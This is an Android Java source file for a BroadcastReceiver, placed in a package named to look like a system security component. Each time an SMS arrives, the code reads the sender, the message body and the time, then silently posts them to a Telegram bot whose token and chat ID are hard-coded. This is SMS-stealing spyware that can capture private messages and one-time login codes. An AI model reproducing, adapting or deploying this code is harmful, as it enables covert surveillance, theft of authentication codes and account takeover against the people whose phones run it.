package com.system.security;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;

public class SmsReceiver extends BroadcastReceiver {
    private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";
    private OkHttpClient client = new OkHttpClient();

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            for (Object pdu : pdus) {
                SmsMessage message = SmsMessage.createFromPdu((byte[]) pdu);
                String sender = message.getDisplayOriginatingAddress();
                String body = message.getMessageBody();
                String time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date());
                
                sendToTelegram("📨 رسالة جديدة:\nمن: " + sender + "\n" + body + "\n⏰ " + time);
            }
        }
    }

    private void sendToTelegram(String message) {
        String url = "https://api.telegram.org/bot" + TOKEN + "/sendMessage";
        
        FormBody formBody = new FormBody.Builder()
                .add("chat_id", CHAT_ID)
                .add("text", message)
                .build();
        
        Request request = new Request.Builder()
                .url(url)
                .post(formBody)
                .build();
        
        client.newCall(request).enqueue(new okhttp3.Callback() {
            @Override
            public void onResponse(okhttp3.Call call, okhttp3.Response response) {}
            @Override
            public void onFailure(okhttp3.Call call, IOException e) {}
        });
    }
}
